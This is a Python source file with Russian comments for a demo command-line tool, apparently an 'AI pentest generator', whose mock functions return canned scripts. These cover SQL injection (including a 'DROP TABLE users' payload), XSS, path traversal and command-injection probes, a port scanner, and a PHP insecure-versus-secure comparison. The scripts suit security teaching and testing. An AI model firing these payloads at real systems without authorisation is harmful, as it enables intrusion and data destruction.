"""
Демо-версия CLI интерфейса для my-pentest-gpt
Работает без ML зависимостей для демонстрации архитектуры
"""
import typer
from typing import Optional
from pathlib import Path
from datetime import datetime
import json

from .config import ensure_directories, PROMPTS_DIR
from .prompt_manager import get_template
from .thinker import apply_think, ThinkingEngine
from .formatter import format_markdown

app = typer.Typer(
    name="my-pentest-gpt-demo",
    help="🛡️ AI-инструмент для кибербезопасности (Демо версия)",
    epilog="Создано экспертом по кибербезопасности для образовательных целей."
)

def mock_generate_code(system_prompt: str, user_prompt: str, **kwargs) -> str:
    """
    Мок-функция для демонстрации генерации кода
    В реальной версии здесь будет DeepSeek-R1-8B
    """

    if "SQL" in user_prompt or "sql" in user_prompt.lower():
        return generate_sql_injection_example()
    elif "XSS" in user_prompt or "xss" in user_prompt.lower():
        return generate_xss_example()
    elif "сканирование" in user_prompt.lower() or "порт" in user_prompt.lower():
        return generate_port_scanner_example()
    elif "анализ" in user_prompt.lower():
        return generate_code_analysis_example()
    else:
        return generate_generic_exploit_example()

def generate_sql_injection_example() -> str:
    """Пример кода для SQL инъекции"""
    return '''```python
import requests
import urllib.parse

def test_sql_injection(url, param_name="username"):
    """
    Тестирует веб-форму на SQL инъекцию
    ТОЛЬКО для образовательных целей!
    """

    payloads = [
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "admin'--",
        "' UNION SELECT NULL,NULL,NULL --",
        "'; DROP TABLE users; --"
    ]

    print("[*] Начинаем тестирование SQL инъекции...")

    for payload in payloads:
        data = {param_name: payload}

        try:
            response = requests.post(url, data=data, timeout=5)

            error_indicators = [
                "sql syntax", "mysql_fetch", "ora-", "postgresql",
                "syntax error", "quoted string", "unclosed quotation"
            ]

            if any(error in response.text.lower() for error in error_indicators):
                print(f"[!] Потенциальная SQL инъекция: {payload}")
                return True

            if any(keyword in response.text.lower() for keyword in ["welcome", "dashboard", "admin"]):
                print(f"[!] Возможная SQL инъекция (обход аутентификации): {payload}")
                return True

        except requests.RequestException as e:
            print(f"Ошибка запроса: {e}")

    print("[*] SQL инъекция не обнаружена")
    return False


if __name__ == "__main__":
    target_url = "http://vulnerable-site.com/login"
    test_sql_injection(target_url)
```'''

def generate_xss_example() -> str:
    """Пример кода для XSS тестирования"""
    return '''```python
import requests
from urllib.parse import urlencode

def test_xss_vulnerability(url, params=None):
    """
    Тестирует веб-приложение на XSS уязвимости
    ТОЛЬКО для образовательных целей!
    """

    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "'><script>alert('XSS')</script>",
        "<iframe src=javascript:alert('XSS')></iframe>"
    ]

    if not params:
        params = {'search': '', 'q': '', 'name': ''}

    print("[*] Тестирование XSS уязвимостей...")

    for param_name in params:
        for payload in payloads:
            test_params = params.copy()
            test_params[param_name] = payload

            try:
                response = requests.get(url, params=test_params, timeout=5)

                if payload in response.text:
                    print(f"[!] Потенциальная XSS в параметре '{param_name}': {payload}")

                    if "<script>" in payload and "<script>" in response.text:
                        print(f"[!!] КРИТИЧЕСКАЯ XSS - скрипт может быть выполнен!")

            except requests.RequestException as e:
                print(f"Ошибка запроса: {e}")

    print("[*] XSS тестирование завершено")


if __name__ == "__main__":
    target_url = "http://vulnerable-site.com/search"
    test_params = {'q': 'test', 'search': 'test'}
    test_xss_vulnerability(target_url, test_params)
```'''

def generate_port_scanner_example() -> str:
    """Пример кода для сканирования портов"""
    return '''```python
import socket
import threading
from concurrent.futures import ThreadPoolExecutor
import argparse

def scan_port(host, port, timeout=1):
    """Сканирует один порт"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            if result == 0:
                service = get_service_name(port)
                print(f"[+] Порт {port} открыт - {service}")
                return port
    except:
        pass
    return None

def get_service_name(port):
    """Определяет сервис по порту"""
    services = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
        53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
        443: "HTTPS", 993: "IMAPS", 995: "POP3S"
    }
    return services.get(port, "Unknown")

def port_scanner(host, start_port=1, end_port=1000, threads=100):
    """Многопоточный сканер портов"""
    print(f"[*] Сканирование {host} портов {start_port}-{end_port}")

    open_ports = []

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(scan_port, host, port): port
            for port in range(start_port, end_port + 1)
        }

        for future in futures:
            result = future.result()
            if result:
                open_ports.append(result)

    print(f"[*] Найдено открытых портов: {len(open_ports)}")
    return sorted(open_ports)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="Целевой хост")
    parser.add_argument("-p", "--ports", default="1-1000")

    args = parser.parse_args()
    start, end = map(int, args.ports.split('-'))

    port_scanner(args.host, start, end)
```'''

def generate_code_analysis_example() -> str:
    """Пример анализа кода на уязвимости"""
    return '''


- **Описание**: Использование функции eval() с пользовательскими данными
- **Риск**: Выполнение произвольного кода на сервере
- **Решение**: Заменить на безопасные альтернативы

- **Описание**: Прямая подстановка данных в SQL запрос
- **Риск**: Утечка данных, модификация БД
- **Решение**: Использовать параметризованные запросы

- **Описание**: Отсутствие экранирования при выводе
- **Риск**: Выполнение скриптов в браузере пользователя
- **Решение**: htmlspecialchars() для всех выводимых данных


```php
// НЕБЕЗОПАСНО:
eval($_POST['code']);
$sql = "SELECT * FROM users WHERE id = " . $_GET['id'];
echo $_POST['comment'];

// БЕЗОПАСНО:
// Убрать eval() полностью
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
echo htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');
```'''

def generate_generic_exploit_example() -> str:
    """Общий пример эксплойта"""
    return '''```python
import requests
import sys
import argparse

class VulnerabilityTester:
    """
    Базовый класс для тестирования уязвимостей
    ТОЛЬКО для образовательных целей!
    """

    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.vulnerabilities = []

    def test_common_vulnerabilities(self):
        """Тестирует общие уязвимости"""

        print("[*] Начинаем тестирование уязвимостей...")

        self.check_server_info()

        self.test_input_validation()

        self.check_security_headers()

        self.print_results()

    def check_server_info(self):
        """Проверяет информацию о сервере"""
        try:
            response = self.session.get(self.target)

            server = response.headers.get('Server', 'Unknown')
            print(f"[*] Сервер: {server}")

            if any(old_version in server.lower() for old_version in ['apache/2.2', 'nginx/1.0']):
                self.vulnerabilities.append({
                    'type': 'Outdated Server',
                    'severity': 'Medium',
                    'description': f'Устаревшая версия сервера: {server}'
                })

        except Exception as e:
            print(f"[!] Ошибка при проверке сервера: {e}")

    def test_input_validation(self):
        """Тестирует валидацию входных данных"""

        test_payloads = [
            "'; DROP TABLE test; --",
            "<script>alert('test')</script>",
            "../../../etc/passwd",
            "$(whoami)"
        ]

        for payload in test_payloads:
            try:
                response = self.session.get(self.target, params={'test': payload})

                if payload in response.text:
                    self.vulnerabilities.append({
                        'type': 'Input Validation',
                        'severity': 'High',
                        'description': f'Отражение payload: {payload[:50]}'
                    })

            except Exception as e:
                print(f"[!] Ошибка при тестировании payload: {e}")

    def check_security_headers(self):
        """Проверяет заголовки безопасности"""

        try:
            response = self.session.get(self.target)
            headers = response.headers

            security_headers = [
                'X-Content-Type-Options',
                'X-Frame-Options',
                'X-XSS-Protection',
                'Content-Security-Policy',
                'Strict-Transport-Security'
            ]

            missing_headers = []
            for header in security_headers:
                if header not in headers:
                    missing_headers.append(header)

            if missing_headers:
                self.vulnerabilities.append({
                    'type': 'Missing Security Headers',
                    'severity': 'Low',
                    'description': f'Отсутствуют заголовки: {", ".join(missing_headers)}'
                })

        except Exception as e:
            print(f"[!] Ошибка при проверке заголовков: {e}")

    def print_results(self):
        """Выводит результаты тестирования"""

        print(f"\n[*] Тестирование завершено")
        print(f"[*] Найдено уязвимостей: {len(self.vulnerabilities)}")

        if self.vulnerabilities:
            print("\n🔍 НАЙДЕННЫЕ УЯЗВИМОСТИ:")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"{i}. {vuln['type']} ({vuln['severity']})")
                print(f"   {vuln['description']}")

if __name__ == "__main__":
    print("🚨 ПРЕДУПРЕЖДЕНИЕ: ТОЛЬКО ДЛЯ ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЕЙ! 🚨")
    print("✅ Используйте только на собственных системах!")
    print("❌ Любое незаконное использование запрещено!\n")

    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="URL для тестирования")
    args = parser.parse_args()

    tester = VulnerabilityTester(args.url)
    tester.test_common_vulnerabilities()
```'''

@app.command()
def generate(
    task: str = typer.Argument(..., help="Тип задачи"),
    prompt_set: str = typer.Option("default", "--prompt-set", "-p"),
    think: bool = typer.Option(True, "--think/--no-think"),
    output: Optional[Path] = typer.Option(None, "--output", "-o"),
    target: Optional[str] = typer.Option(None, "--target"),
    custom_prompt: Optional[str] = typer.Option(None, "--custom")
):
    """🚀 Генерирует код для задач кибербезопасности (демо версия)"""

    print("🛡️ my-pentest-gpt - AI Генератор для Кибербезопасности (ДЕМО)")
    print("="*60)

    try:
        template_data = get_template(task, prompt_set)
        user_prompt = custom_prompt or template_data["user_template"]

        if target:
            user_prompt += f"\n\nЦель: {target}"

        task_type = _detect_task_type(task)
        enhanced_prompt = apply_think(user_prompt, think, task_type)

        print(f"[*] Задача: {task}")
        print(f"[*] Набор промптов: {prompt_set}")
        print(f"[*] Chain-of-Thought: {'включен' if think else 'выключен'}")
        print(f"[*] Генерация...")

        generated_text = mock_generate_code(
            template_data["system_prompt"],
            enhanced_prompt
        )

        thinking_engine = ThinkingEngine()
        code, reasoning = thinking_engine.extract_reasoning(generated_text)

        if not code:
            code = generated_text

        metadata = {
            "model": "DeepSeek-R1-8B (Демо)",
            "temperature": 0.7,
            "max_tokens": 512,
            "thinking_enabled": think,
            "timestamp": datetime.now().isoformat()
        }

        task_info = {
            "task_name": task,
            "description": template_data.get("description", ""),
            "target": target or "Не указана"
        }

        formatted_result = format_markdown(code, reasoning, task_info, metadata)

        print("\n" + "="*60)
        print(formatted_result)
        print("="*60)

        if output:
            output.parent.mkdir(parents=True, exist_ok=True)
            with open(output, 'w', encoding='utf-8') as f:
                f.write(formatted_result)
            print(f"\n✅ Результат сохранен в: {output}")

    except Exception as e:
        print(f"❌ Ошибка: {e}")
        raise typer.Exit(1)

@app.command()
def list_templates():
    """📋 Показывает список доступных шаблонов"""
    from .prompt_manager import prompt_manager

    templates = prompt_manager.list_templates()

    if not templates:
        print("⚠️ Шаблоны не найдены")
        return

    print("📋 Доступные шаблоны:\n")

    for template in templates:
        print(f"• {template['name']}: {template['description']}")

@app.command()
def setup():
    """⚙️ Настраивает рабочую среду"""
    print("🔧 Настройка my-pentest-gpt (демо версия)")
    print("="*50)

    try:
        ensure_directories()
        print("✅ Структура директорий создана")
        print("✅ Промпты загружены")
        print("\n🎉 Настройка завершена!")
        print("\nПример использования:")
        print("python -m src.cli_demo generate generate_exploit --target 'SQL injection'")

    except Exception as e:
        print(f"❌ Ошибка настройки: {e}")
        raise typer.Exit(1)

def _detect_task_type(task: str) -> str:
    """Определяет тип задачи"""
    if "analyze" in task.lower():
        return "analyze"
    elif "reverse" in task.lower():
        return "reverse"
    else:
        return "exploit"

if __name__ == "__main__":
    app()
